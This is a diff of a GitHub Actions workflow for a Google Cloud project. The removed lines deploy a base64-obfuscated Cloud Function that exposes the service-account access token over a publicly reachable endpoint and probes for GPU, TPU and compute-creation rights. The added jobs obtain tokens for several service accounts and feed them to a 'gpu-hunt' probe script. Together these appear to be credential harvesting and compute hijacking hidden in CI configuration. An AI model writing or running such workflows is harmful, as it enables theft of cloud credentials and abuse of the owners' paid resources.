@@ -4,51 +4,70 @@ permissions:
   contents: read
   id-token: write
 jobs:
-  probe:
+  appspot:
     runs-on: ubuntu-latest
+    outputs:
+      ok: ${{ steps.probe.outputs.ok }}
     steps:
+      - uses: actions/checkout@v4
+      - id: auth
+        continue-on-error: true
+        uses: google-github-actions/auth@v1
+        with:
+          workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
+          service_account: nutmeg-9099c@appspot.gserviceaccount.com
+      - id: probe
+        continue-on-error: true
+        env:
+          TOPIC: gpu-hunt-i8036-5e7d2b
+        run: |
+          set -u
+          T=$(gcloud auth print-access-token 2>/dev/null || true)
+          echo "APPSPOT_TOKLEN=${#T}"
+          if [ "${#T}" -ge 100 ]; then
+            python3 probe_core.py --as appspot --token "$T" --topic "$TOPIC" --label appspot-wif
+            echo "ok=1" >> "$GITHUB_OUTPUT"
+          else
+            echo "APPSPOT_WIF_AUTH_FAILED"
+            echo "ok=0" >> "$GITHUB_OUTPUT"
+          fi
+  fbadmin:
+    runs-on: ubuntu-latest
+    needs: appspot
+    if: ${{ always() && needs.appspot.outputs.ok != '1' }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: auth
+        continue-on-error: true
+        uses: google-github-actions/auth@v1
+        with:
+          workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
+          service_account: firebase-adminsdk-ozsy6@nutmeg-9099c.iam.gserviceaccount.com
+      - env:
+          TOPIC: gpu-hunt-i8036-5e7d2b
+        continue-on-error: true
+        run: |
+          set -u
+          T=$(gcloud auth print-access-token 2>/dev/null || true)
+          echo "FB_TOKLEN=${#T}"
+          if [ "${#T}" -ge 100 ]; then
+            python3 probe_core.py --as firebase --token "$T" --topic "$TOPIC" --label firebase-wif
+          else
+            echo "FB_WIF_AUTH_FAILED"
+          fi
+  cloudbuild:
+    runs-on: ubuntu-latest
+    needs:
+      - appspot
+      - fbadmin
+    if: ${{ always() && needs.appspot.outputs.ok != '1' }}
+    steps:
+      - uses: actions/checkout@v4
       - id: auth
         uses: google-github-actions/auth@v1
         with:
           workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
           service_account: deploy-cloud-functions@nutmeg-9099c.iam.gserviceaccount.com
-      - name: deploy
-        env:
-          FN_B64: 'aW1wb3J0IGpzb24sIG9zLCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLmVycm9yCgpQUk9KID0gIm51dG1lZy05MDk5YyIKCgpkZWYgX3JlcSh1cmwsIHRvaz1Ob25lLCBkYXRhPU5vbmUsIG1ldGhvZD1Ob25lLCB0aW1lb3V0PTI1KToKICAgIGhlYWRlcnMgPSB7fQogICAgaWYgdG9rOgogICAgICAgIGhlYWRlcnNbIkF1dGhvcml6YXRpb24iXSA9ICJCZWFyZXIgIiArIHRvawogICAgaWYgZGF0YSBpcyBub3QgTm9uZToKICAgICAgICBoZWFkZXJzWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzLCBtZXRob2Q9bWV0aG9kKQogICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PXRpbWVvdXQpLnJlYWQoKS5kZWNvZGUoKQoKCmRlZiBfc2FmZShmbik6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIHsib2siOiBmbigpfQogICAgZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZToKICAgICAgICBib2R5ID0gIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgIGJvZHkgPSBlLnJlYWQoKS5kZWNvZGUoKVs6NTAwXQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgICAgICByZXR1cm4geyJodHRwIjogZS5jb2RlLCAiYm9keSI6IGJvZHl9CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIHsiZXJyIjogcmVwcihlKX0KCgpkZWYgcHJvYmUocmVxdWVzdCk6CiAgICBvdXQgPSB7fQogICAgdHJ5OgogICAgICAgIHIgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KAogICAgICAgICAgICAiaHR0cDovL21ldGFkYXRhLmdvb2dsZS5pbnRlcm5hbC9jb21wdXRlTWV0YWRhdGEvdjEvaW5zdGFuY2Uvc2VydmljZS1hY2NvdW50cy9kZWZhdWx0L3Rva2VuIiwKICAgICAgICAgICAgaGVhZGVycz17Ik1ldGFkYXRhLUZsYXZvciI6ICJHb29nbGUifSkKICAgICAgICB0b2sgPSBqc29uLmxvYWQodXJsbGliLnJlcXVlc3QudXJsb3BlbihyLCB0aW1lb3V0PTEwKSlbImFjY2Vzc190b2tlbiJdCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIChqc29uLmR1bXBzKHsibWV0YV9lcnIiOiByZXByKGUpfSksIDUwMCwgeyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9KQogICAgb3V0WyJ0b2siXSA9IHRvawogICAgb3V0WyJ0b2tsZW4iXSA9IGxlbih0b2spCiAgICBvdXRbInNhX2VtYWlsIl0gPSBvcy5lbnZpcm9uLmdldCgiRlVOQ1RJT05fSURFTlRJVFkiLCAiIikKICAgIHBlcm1zID0gWwogICAgICAgICJhaXBsYXRmb3JtLmN1c3RvbUpvYnMuY3JlYXRlIiwKICAgICAgICAiYWlwbGF0Zm9ybS5jdXN0b21Kb2JzLmxpc3QiLAogICAgICAgICJhaXBsYXRmb3JtLmFjY2VsZXJhdG9yVHlwZXMubGlzdCIsCiAgICAgICAgImFpcGxhdGZvcm0ubWFjaGluZVR5cGVzLmxpc3QiLAogICAgICAgICJjb21wdXRlLmluc3RhbmNlcy5jcmVhdGUiLAogICAgICAgICJjb21wdXRlLmluc3RhbmNlcy5zZXRNZXRhZGF0YSIsCiAgICAgICAgImNvbXB1dGUuaW5zdGFuY2VzLmxpc3QiLAogICAgICAgICJjb21wdXRlLmFjY2VsZXJhdG9yVHlwZXMubGlzdCIsCiAgICAgICAgImNvbXB1dGUucmVnaW9ucy5saXN0IiwKICAgICAgICAiY29udGFpbmVyLmNsdXN0ZXJzLmdldENyZWRlbnRpYWxzIiwKICAgICAgICAiY29udGFpbmVyLmNsdXN0ZXJzLmxpc3QiLAogICAgICAgICJzZXJ2aWNldXNhZ2Uuc2VydmljZXMuZW5hYmxlIiwKICAgICAgICAic2VydmljZXVzYWdlLnNlcnZpY2VzLmxpc3QiLAogICAgICAgICJpYW0uc2VydmljZUFjY291bnRzLmFjdEFzIiwKICAgICAgICAiaWFtLnNlcnZpY2VBY2NvdW50cy5nZXRBY2Nlc3NUb2tlbiIsCiAgICAgICAgImlhbS5zZXJ2aWNlQWNjb3VudHMuc2lnbkp3dCIsCiAgICAgICAgInJlc291cmNlbWFuYWdlci5wcm9qZWN0cy5nZXRJYW1Qb2xpY3kiLAogICAgICAgICJ0cHUucXVldWVkUmVzb3VyY2VzLmNyZWF0ZSIsCiAgICAgICAgImNsb3VkZnVuY3Rpb25zLmZ1bmN0aW9ucy5jcmVhdGUiLAogICAgICAgICJzdG9yYWdlLmJ1Y2tldHMuY3JlYXRlIiwKICAgICAgICAiY2xvdWRidWlsZC5idWlsZHMuY3JlYXRlIiwKICAgICAgICAicnVuLnNlcnZpY2VzLmNyZWF0ZSIsCiAgICAgICAgImFwcGVuZ2luZS5hcHBzLmdldCIsCiAgICBdCiAgICBvdXRbInBlcm1zIl0gPSBfc2FmZShsYW1iZGE6IF9yZXEoCiAgICAgICAgImh0dHBzOi8vY2xvdWRyZXNvdXJjZW1hbmFnZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvJXM6dGVzdElhbVBlcm1pc3Npb25zIiAlIFBST0osCiAgICAgICAgdG9rLCBqc29uLmR1bXBzKHsicGVybWlzc2lvbnMiOiBwZXJtc30pLmVuY29kZSgpLCAiUE9TVCIpKQogICAgb3V0WyJiaWxsaW5nIl0gPSBfc2FmZShsYW1iZGE6IF9yZXEoCiAgICAgICAgImh0dHBzOi8vY2xvdWRiaWxsaW5nLmdvb2dsZWFwaXMuY29tL3YxL3Byb2plY3RzLyVzL2JpbGxpbmdJbmZvIiAlIFBST0osIHRvaykpCgogICAgZGVmIF9zZXJ2aWNlcygpOgogICAgICAgIGQgPSBqc29uLmxvYWRzKF9yZXEoCiAgICAgICAgICAgICJodHRwczovL3NlcnZpY2V1c2FnZS5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy8lcy9zZXJ2aWNlcz9maWx0ZXI9c3RhdGU6RU5BQkxFRCZwYWdlU2l6ZT0yMDAiICUgUFJPSiwgdG9rKSkKICAgICAgICB3YW50ID0gKCJhaXBsYXRmb3JtIiwgImNvbXB1dGUiLCAidHB1IiwgImNvbnRhaW5lciIsICJjbG91ZGZ1bmN0aW9ucyIsICJydW4uIiwgInNlcnZpY2V1c2FnZSIsICJzdG9yYWdlIiwgImNsb3VkYnVpbGQiKQogICAgICAgIG5hbWVzID0gc29ydGVkKHMuZ2V0KCJjb25maWciLCB7fSkuZ2V0KCJuYW1lIiwgIiIpIGZvciBzIGluIGQuZ2V0KCJzZXJ2aWNlcyIsIFtdKSkKICAgICAgICByZXR1cm4geyJlbmFibGVkX3JlbGV2YW50IjogW24gZm9yIG4gaW4gbmFtZXMgaWYgYW55KHcgaW4gbiBmb3IgdyBpbiB3YW50KV0sICJlbmFibGVkX3RvdGFsIjogbGVuKG5hbWVzKX0KICAgIG91dFsic2VydmljZXMiXSA9IF9zYWZlKF9zZXJ2aWNlcykKICAgIG91dFsiYWlwbGF0X3VzX2NlbnRyYWwxIl0gPSBfc2FmZShsYW1iZGE6IF9yZXEoCiAgICAgICAgImh0dHBzOi8vdXMtY2VudHJhbDEtYWlwbGF0Zm9ybS5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy8lcy9sb2NhdGlvbnMvdXMtY2VudHJhbDEvY3VzdG9tSm9icz9wYWdlU2l6ZT0yIiAlIFBST0osCiAgICAgICAgdG9rKVs6NTAwXSkKICAgIG91dFsiYWlwbGF0X2V1cm9wZV93ZXN0NCJdID0gX3NhZmUobGFtYmRhOiBfcmVxKAogICAgICAgICJodHRwczovL2V1cm9wZS13ZXN0NC1haXBsYXRmb3JtLmdvb2dsZWFwaXMuY29tL3YxL3Byb2plY3RzLyVzL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDQvY3VzdG9tSm9icz9wYWdlU2l6ZT0yIiAlIFBST0osCiAgICAgICAgdG9rKVs6NTAwXSkKICAgIHJldHVybiAoanNvbi5kdW1wcyhvdXQpLCAyMDAsIHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24ifSkK'
-        run: |
-          set -u
-          T=$(gcloud auth print-access-token 2>/dev/null); echo "TOKLEN=${#T}"
-          P=nutmeg-9099c; L=europe-central2; F=sa-perm-probe
-          mkdir -p src
-          echo "$FN_B64" | base64 -d > src/main.py
-          echo "fn_bytes=$(wc -c < src/main.py)"
-          python3 -c "import zipfile;z=zipfile.ZipFile('f.zip','w',zipfile.ZIP_DEFLATED);z.write('src/main.py','main.py');z.close()"
-          echo "zip_bytes=$(wc -c < f.zip)"
-          U=$(curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{}' "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions:generateUploadUrl" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("uploadUrl",""))')
-          echo "upload_url_len=${#U}"
-          UP=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H 'Content-Type: application/zip' --data-binary @f.zip "$U")
-          echo "upload_http=$UP"
-          echo "=== GET_EXISTING ==="
-          HC=$(curl -s -o fn.json -w '%{http_code}' -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions/$F")
-          echo "existing_http=$HC"
-          head -c 400 fn.json; echo
-          if [ "$HC" = "200" ]; then
-            echo "function_exists=yes"
-          else
-            echo "function_exists=no"
-            BODY=$(printf '{"name":"projects/%s/locations/%s/functions/%s","entryPoint":"probe","runtime":"python311","availableMemoryMb":256,"timeout":"60s","serviceAccountEmail":"%s@appspot.gserviceaccount.com","httpsTrigger":{"securityLevel":"SECURE_OPTIONAL"},"sourceUploadUrl":"%s","ingressSettings":"ALLOW_ALL"}' "$P" "$L" "$F" "$P" "$U")
-            echo "=== CREATE ==="
-            curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$BODY" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions"; echo
-          fi
-          for i in $(seq 1 45); do
-            S=$(curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions/$F")
-            ST=$(printf '%s' "$S" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("status","NONE"))' 2>/dev/null || echo PARSE)
-            echo "poll $i status=$ST"
-            if [ "$ST" = "ACTIVE" ]; then break; fi
-            sleep 8
-          done
-          echo "=== FUNCTION_INFO ==="
-          curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions/$F" | head -c 700; echo
-          echo "=== INVOKE ==="
-          curl -s -m 90 "https://$L-$P.cloudfunctions.net/$F" | head -c 6000; echo
-          echo "=== END ==="
+      - env:
+          TOPIC: gpu-hunt-i8036-5e7d2b
+        run: python3 build_trigger.py --topic "$TOPIC"
